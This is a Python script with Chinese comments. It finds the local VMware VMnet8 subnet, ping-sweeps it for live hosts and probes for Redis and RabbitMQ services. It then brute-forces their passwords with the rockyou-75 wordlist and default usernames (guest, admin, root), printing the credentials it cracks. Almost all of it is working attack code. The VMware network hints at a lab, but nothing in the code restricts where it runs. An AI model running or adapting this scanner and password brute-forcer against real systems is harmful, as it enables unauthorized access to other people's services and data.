import subprocess
import socket
import redis
import json
import pika
import re

def get_network_prefix():
    try:
        output = subprocess.check_output("ipconfig", encoding='gbk', errors='ignore')
        lines = output.splitlines()

        block = []
        collecting = False
        for line in lines:
            # 检测 VMnet8 网卡标题行
            if "VMware Network Adapter VMnet8" in line:
                collecting = True
                block.append(line)
                continue
            if collecting:
                # 如果遇到下一个“适配器”开头的行，说明下一个网卡开始，结束收集
                if re.match(r"^\s*.*适配器.*:", line) and "VMware Network Adapter VMnet8" not in line:
                    break
                block.append(line)

        # 输出收集到的内容调试
        print("[DEBUG] VMnet8 网卡信息块内容：")
        for l in block:
            print(l)

        block_text = "\n".join(block)
        # 提取 IPv4 地址
        match = re.search(r"IPv4\s*地址.*?[：:]\s*([\d]+\.[\d]+\.[\d]+\.[\d]+)", block_text)
        if match:
            ip = match.group(1)
            prefix = ".".join(ip.split(".")[:3]) + "."
            print(f"[INFO] 虚拟网关前缀：{prefix}（来自 VMnet8）")
            return prefix
        else:
            print("[WARN] 未在 VMnet8 网卡中找到 IPv4 地址")

    except Exception as e:
        print(f"[ERROR] 获取网关失败: {e}")
    return None





# ping 探测主机是否存活
def ping_host(ip):
    try:
        output = subprocess.check_output(
            ["ping", "-n", "1", "-w", "200", ip],
            stderr=subprocess.DEVNULL,
            encoding='gbk'
        )
        return "TTL=" in output
    except:
        return False


# 检测端口是否开放
def check_port(ip, port):
    try:
        with socket.create_connection((ip, port), timeout=1):
            return True
    except:
        return False


# 加载字典
def load_passwords(path="rockyou-75.txt"):
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print("[ERROR] 字典文件 rockyou-75.txt 未找到！")
        return []


# Redis 弱口令爆破
def brute_force_redis(ip, port, password_list):
    for pwd in password_list:
        try:
            r = redis.StrictRedis(host=ip, port=port, password=pwd, socket_connect_timeout=2)
            r.ping()
            print(f"[SUCCESS] Redis 弱口令成功: {ip}:{port} -> 密码: {pwd}")
            return {'ip': ip, 'port': port, 'service': 'Redis', 'password': pwd}
        except:
            continue
    print(f"[INFO] Redis {ip}:{port} 未发现弱口令")
    return None


# RabbitMQ 弱口令爆破
def brute_force_rabbitmq(ip, port, user_list, password_list):
    for username in user_list:
        for password in password_list:
            try:
                credentials = pika.PlainCredentials(username, password)
                parameters = pika.ConnectionParameters(
                    host=ip, port=port, credentials=credentials, socket_timeout=3
                )
                connection = pika.BlockingConnection(parameters)
                connection.close()
                print(f"[SUCCESS] RabbitMQ 弱口令成功: {ip}:{port} -> {username}:{password}")
                return {
                    'ip': ip,
                    'port': port,
                    'service': 'RabbitMQ',
                    'username': username,
                    'password': password
                }
            except:
                continue
    print(f"[INFO] RabbitMQ {ip}:{port} 未发现弱口令")
    return None


# 主函数
def main():
    prefix = get_network_prefix()
    print(f"[DEBUG] 获取到的网段前缀: {prefix}")  # 添加此行
    if not prefix:
        return

    print(f"[INFO] 正在扫描网段 {prefix}0/24 ...")
    live_hosts = [f"{prefix}{i}" for i in range(2, 255) if ping_host(f"{prefix}{i}")]
    print(f"[INFO] 存活主机: {live_hosts}")

    passwords = load_passwords()
    if not passwords:
        return

    results = []

    # Redis 探测与爆破
    for ip in live_hosts:
        if check_port(ip, 6379):
            print(f"[INFO] 发现 Redis 服务: {ip}:6379")
            result = brute_force_redis(ip, 6379, passwords)
            if result:
                results.append(result)

    # RabbitMQ 探测与爆破（端口映射为 4568）
    rabbitmq_port = 4568
    rabbitmq_users = ['guest', 'admin', 'root']
    for ip in live_hosts:
        if check_port(ip, rabbitmq_port):
            print(f"[INFO] 发现 RabbitMQ 服务: {ip}:{rabbitmq_port}")
            result = brute_force_rabbitmq(ip, rabbitmq_port, rabbitmq_users, passwords)
            if result:
                results.append(result)

    # 输出爆破结果
    print("\n[RESULT] 爆破结果：")
    print(json.dumps(results, indent=2, ensure_ascii=False))


if __name__ == "__main__":
    main()
